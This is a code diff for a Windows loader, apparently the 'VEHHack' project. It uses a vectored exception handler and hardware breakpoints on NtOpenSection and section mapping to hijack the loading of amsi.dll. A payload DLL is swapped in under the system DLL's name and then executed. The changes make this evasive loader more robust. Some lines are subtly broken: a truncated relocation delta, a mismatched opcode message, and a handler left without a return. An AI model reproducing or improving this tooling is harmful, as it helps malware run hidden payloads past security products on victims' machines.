@@ -57,7 +57,7 @@ DWORD RvaToFoa(DWORD rva, PIMAGE_NT_HEADERS nt) {
 
 VOID FixRelocation(PVOID pMemBase, BYTE* pFileData) {
 	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pFileData);
-	DWORD delta = (ULONGLONG)pNt->OptionalHeader.ImageBase - (ULONGLONG)pMemBase;
+	DWORD delta = (ULONGLONG)pMemBase - (ULONGLONG)pNt->OptionalHeader.ImageBase;
 	if (delta == 0) {
 		return;
 	}
@@ -139,7 +139,7 @@ BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
 	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
 		PCONTEXT ctx = ExceptionInfo->ContextRecord;
 		if (gLdrState == LdrState::StateOpenSection) {
-			ctx->Rcx = (DWORD64)gHandle;
+			*(PHANDLE)ctx->Rcx = gHandle;
 			ctx->Rax = 0;
 			BYTE* rip = (BYTE*)ctx->Rip;
 			while (*rip != 0xc3) {
@@ -151,8 +151,9 @@ BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
 			NtContinue(ctx, FALSE);
 			return EXCEPTION_CONTINUE_EXECUTION;
 		}
-		else if (gLdrState == LdrState::StateMapViewOfSection) {
-			if (ctx->Rcx != (DWORD64)gHandle) {
+		//else if (gLdrState == LdrState::StateMapViewOfSection) 
+		else {
+			if ((HANDLE)ctx->Rcx != gHandle) {
 				return EXCEPTION_CONTINUE_EXECUTION;
 			}
 			PVOID* baseAddrPtr = (PVOID*)ctx->R8;
@@ -160,17 +161,29 @@ BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
 			ULONG* allocTypePtr = (ULONG*)(ctx->Rsp + 0x48);
 			ULONG* protectPtr = (ULONG*)(ctx->Rsp + 0x50);
 
-			*baseAddrPtr = gBaseAddress;
-			*viewSizePtr = gViewSize;
+			if (baseAddrPtr) {
+				*baseAddrPtr = gBaseAddress;
+			}
+			if (viewSizePtr) {
+				*viewSizePtr = gViewSize;
+			}
+			
 
 			*allocTypePtr = 0;
-			*protectPtr = PAGE_EXECUTE_READWRITE;
+			*protectPtr = PAGE_EXECUTE_READ;
 
 			ctx->Rax = 0;
 			BYTE* rip = (BYTE*)ctx->Rip;
+			size_t count = 0;
 			while (*rip != 0xc3) {
 				rip++;
+				count++;
+				if (count >= 32) {
+					printf("Cannot find opcode: 0x3c\n");
+					exit(-1);
+				}
 			}
+			printf("count = %zu\n", count);
 			ctx->Rip = (ULONG_PTR)rip;
 
 			ctx->Dr0 = 0LL;
@@ -190,7 +203,7 @@ BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
 	
 	}
 	
-	return FALSE;
+//	return FALSE;
 }
 
 BOOL MovePayloadToMemory(PVOID pDest, BYTE* pPayloadData, DWORD dwPayloadSize) {
@@ -213,8 +226,16 @@ int main() {
 	hNtdll = GetModuleHandleA("ntdll.dll");
 	InitWinAPI();
 	//load payload
-	char pPayload[] = "C:\\Users\\Administrator\\source\\repos\\BlackIce417\\VEHHack\\x64\\Debug\\Payload.dll";
-	HANDLE hPayloadHandle = CreateFileA(pPayload, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	char szPayload[MAX_PATH] = { 0 };
+	GetModuleFileNameA(NULL, szPayload, MAX_PATH);
+	char* p = strrchr(szPayload, '\\');
+	if (p)
+	{
+		*(p + 1) = '\0';
+	}
+	strcat_s(szPayload, "Payload.dll");
+	printf("Payload path: %s\n", szPayload);
+	HANDLE hPayloadHandle = CreateFileA(szPayload, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD dwPayloadSize = GetFileSize(hPayloadHandle, NULL);
 	BYTE* pPlayloadData = new BYTE[dwPayloadSize + 1];
 	memset(pPlayloadData, 0, dwPayloadSize + 1);
@@ -261,16 +282,24 @@ int main() {
 	PIMAGE_NT_HEADERS pPayloadNtHeader = RtlImageNtHeader(pPlayloadData);
 	DWORD entry_point = pPayloadNtHeader->OptionalHeader.AddressOfEntryPoint;
 	delete pPlayloadData;
-	pPlayloadData = nullptr;
 	gHandle = hSection;
 	gViewSize = ViewSize;
+	gBaseAddress = pBaseAddress;
 	AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)VectoredHandler);
-	SetHardwareBreakpoint(NtOpenSection, nullptr);
+	if (!SetHardwareBreakpoint(NtOpenSection, nullptr)) {
+		printf("Fail to set bp\n");
+		return -1;
+	}
 	HANDLE handle = LoadLibraryA("amsi.dll");
+	if (!handle) {
+		printf("Fail to load amsi.dll. Error: 0x%08x", GetLastError());
+		return -1;
+	}
 	RemoveVectoredExceptionHandler(VectoredHandler);
 
 	PVOID EP = (PVOID)((DWORD64)pBaseAddress + entry_point);
 	((VOID(*)())EP)();
+
 
 	return 0;
 }
